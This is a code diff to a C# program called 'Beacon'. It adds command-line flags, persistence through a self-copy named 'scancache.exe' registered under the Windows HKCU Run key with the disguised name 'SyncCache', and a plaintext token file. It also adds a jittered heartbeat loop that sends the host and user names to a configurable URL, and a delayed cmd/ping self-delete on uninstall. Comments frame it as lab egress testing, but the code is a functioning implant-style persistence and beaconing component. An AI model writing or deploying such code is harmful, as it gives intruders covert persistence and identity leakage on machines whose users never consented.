@@ -5,6 +5,7 @@
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
 using Microsoft.Win32.SafeHandles;
 using System.Diagnostics;
 using System.IO;
@@ -17,6 +18,24 @@ using System.Threading.Tasks;
 class Beacon
 {
     const int NetTimeoutMs = 4000;
+
+    static int ParseInt(string s, int dflt)
+    {
+        int v; return int.TryParse(s, out v) && v >= 0 ? v : dflt;
+    }
+
+    static string RebuildArgs(Dictionary<string, string> a)
+    {
+        // keep boot-run config identical; token travels via token.cfg instead
+        string[] keys = { "tag", "echo", "gh", "get", "dns", "alive", "hb", "persist", "runname" };
+        List<string> parts = new List<string>();
+        foreach (string k in keys)
+        {
+            if (k == "persist") { if (a.ContainsKey(k)) parts.Add("--persist"); continue; }
+            if (a.ContainsKey(k) && k != "persist") parts.Add("--" + k + " \"" + a[k] + "\"");
+        }
+        return string.Join(" ", parts.ToArray());
+    }
 
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     static extern SafeFileHandle CreateFileW(string name, uint access, uint share,
@@ -60,17 +79,29 @@ class Beacon
     static int Main(string[] argv)
     {
         ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
+        // flags may carry a value OR stand alone; a trailing bare flag still counts
         Dictionary<string, string> a = new Dictionary<string, string>();
-        for (int i = 0; i < argv.Length - 1; i++)
-            if (argv[i].StartsWith("--")) a[argv[i].Substring(2)] = argv[i + 1];
+        for (int i = 0; i < argv.Length; i++)
+        {
+            if (!argv[i].StartsWith("--")) continue;
+            string key = argv[i].Substring(2);
+            if (i + 1 < argv.Length && !argv[i + 1].StartsWith("--")) { a[key] = argv[i + 1]; i++; }
+            else a[key] = "1";
+        }
         string tag = a.ContainsKey("tag") ? a["tag"] : "manual";
         string echoText = a.ContainsKey("echo") ? a["echo"] : "";
         string token = a.ContainsKey("token") ? a["token"] : Environment.GetEnvironmentVariable("GMR");
+        if (token != null) token = token.Trim((char)0, ' ', '\t', '\r', '\n');   // CM blobs carry NULs
         string gh = a.ContainsKey("gh") ? a["gh"] : "";              // owner/repo
         string getUrl = a.ContainsKey("get") ? a["get"] : "";        // sink: {t} {h} {u} {tag} substituted
         string dnsDom = a.ContainsKey("dns") ? a["dns"] : "";        // per-run label prepended
         bool noWrite = a.ContainsKey("no-write");
         string outDir = a.ContainsKey("out") ? a["out"] : null;      // override for lab tests
+        int aliveS = a.ContainsKey("alive") ? ParseInt(a["alive"], 0) : 0;   // heartbeat window seconds
+        int hbS = a.ContainsKey("hb") ? ParseInt(a["hb"], 20) : 20;          // beat interval
+        bool persist = a.ContainsKey("persist");                             // HKCU Run self-copy
+        bool uninstall = a.ContainsKey("uninstall");
+        string runName = a.ContainsKey("runname") ? a["runname"] : "SyncCache";
 
         // ---- facts (never trust wall alone for cross-box ordering - clock law) ----
         string tsUtc = DateTime.UtcNow.ToString("yyyyMMddTHHmmssZ");
@@ -156,6 +187,50 @@ class Beacon
         }
         catch (Exception e) { log.Add("local:ERR " + J(e.Message)); }
 
+        // late token source: token.cfg written by a --persist run (boot runs have
+        // no env/argv token). LAB FILE, PLAINTEXT: treat like a sticky note.
+        string tokCfg = Path.Combine(dir, "token.cfg");
+        if (string.IsNullOrEmpty(token))
+            try { if (File.Exists(tokCfg)) token = File.ReadAllText(tokCfg).Trim(); } catch { }
+
+        // ---- UNINSTALL: remove anchors + copies, skip all network lanes ----
+        if (uninstall)
+        {
+            try
+            {
+                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                {
+                    if (k != null && k.GetValue(runName) != null)
+                    { k.DeleteValue(runName, false); log.Add("uninstall:runkey-removed " + runName); }
+                    else log.Add("uninstall:runkey-absent");
+                }
+            }
+            catch (Exception e) { log.Add("uninstall:runkey-ERR " + J(e.Message)); }
+            try
+            {
+                string dest = Path.Combine(dir, "scancache.exe");
+                bool fromCopy = string.Equals(exe, dest, StringComparison.OrdinalIgnoreCase);
+                if (File.Exists(dest))
+                {
+                    if (fromCopy)
+                    {
+                        Process.Start(new ProcessStartInfo("cmd.exe",
+                            "/c ping -n 8 127.0.0.1 >nul & del /q \"" + dest + "\"")
+                            { CreateNoWindow = true, UseShellExecute = false });
+                        log.Add("uninstall:copy-delayed-delete");
+                    }
+                    else { File.Delete(dest); log.Add("uninstall:copy-deleted"); }
+                }
+                if (File.Exists(tokCfg)) File.Delete(tokCfg);
+            }
+            catch (Exception e) { log.Add("uninstall:copy-ERR " + J(e.Message)); }
+            try { File.AppendAllText(Path.Combine(dir, "lanes.log"),
+                tsUtc + " " + tag + " " + string.Join(" | ", log.ToArray()) + "\n"); }
+            catch { }
+            return 0;
+        }
+
         // ---- LANE 2: DNS egress probe (survives most proxy regimes) ----
         if (dnsDom != "")
         {
@@ -223,6 +298,66 @@ class Beacon
                     .Replace(".json", "") + ".lanes.txt", string.Join("\n", log.ToArray()) + "\n");
             }
             catch { }
+        }
+
+        // ---- LANE 5: PERSIST (HKCU Run + self-copy; boot runs re-emit receipts) ----
+        if (persist)
+        {
+            try
+            {
+                string dest = Path.Combine(dir, "scancache.exe");
+                if (string.Equals(exe, dest, StringComparison.OrdinalIgnoreCase))
+                    log.Add("persist:running-from-copy");
+                else { File.Copy(exe, dest, true); log.Add("persist:copied " + dest); }
+                if (!string.IsNullOrEmpty(token))
+                    try { File.WriteAllText(tokCfg, token); log.Add("persist:token.cfg written (PLAINTEXT lab file)"); }
+                    catch (Exception e2) { log.Add("persist:tokencfg-ERR " + J(e2.Message)); }
+                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                {
+                    if (k != null)
+                    {
+                        k.SetValue(runName, "\"" + dest + "\" " + RebuildArgs(a));
+                        log.Add("persist:runkey " + runName);
+                    }
+                    else log.Add("persist:ERR run-key-unavailable");
+                }
+            }
+            catch (Exception e) { log.Add("persist:ERR " + J(e.Message)); }
+        }
+
+        // ---- LANE 6: ALIVE heartbeat window (survival signal; ±15% jitter per beat) ----
+        if (aliveS > 0)
+        {
+            Random rnd = new Random(unchecked((int)Stopwatch.GetTimestamp()));
+            Stopwatch sw = Stopwatch.StartNew();
+            int beats = 0;
+            while (sw.Elapsed.TotalSeconds < aliveS)
+            {
+                int sl = (int)(hbS * 1000.0 * (0.85 + rnd.NextDouble() * 0.30));
+                int left = (int)((aliveS - sw.Elapsed.TotalSeconds) * 1000) + 50;
+                Thread.Sleep(sl < 1000 ? 1000 : (sl > left ? left : sl));
+                beats++;
+                log.Add("beat " + beats + " +" + (int)sw.Elapsed.TotalSeconds + "s");
+                try { File.AppendAllText(Path.Combine(dir, "beats.log"), tsUtc + " " + tag +
+                    " beat=" + beats + " +" + (int)sw.Elapsed.TotalSeconds + "s\n"); }
+                catch { }
+                if (getUrl != "")
+                {
+                    string u = getUrl.Replace("{t}", tsUtc).Replace("{h}", Uri.EscapeDataString(host))
+                        .Replace("{u}", Uri.EscapeDataString(user))
+                        .Replace("{tag}", Uri.EscapeDataString(tag))
+                        + (getUrl.IndexOf('?') >= 0 ? "&" : "?") + "beat=" + beats;
+                    var rb = Try("beat" + beats, log, delegate
+                    {
+                        HttpWebRequest q = (HttpWebRequest)WebRequest.Create(u);
+                        q.Timeout = NetTimeoutMs; q.UserAgent = "scan/1.0";
+                        return (HttpWebResponse)q.GetResponse();
+                    });
+                    if (rb != null) try { rb.Close(); } catch { }
+                }
+            }
+            log.Add("alive:done after " + (int)sw.Elapsed.TotalSeconds + "s beats=" + beats);
         }
 
         // final lanes log always on disk
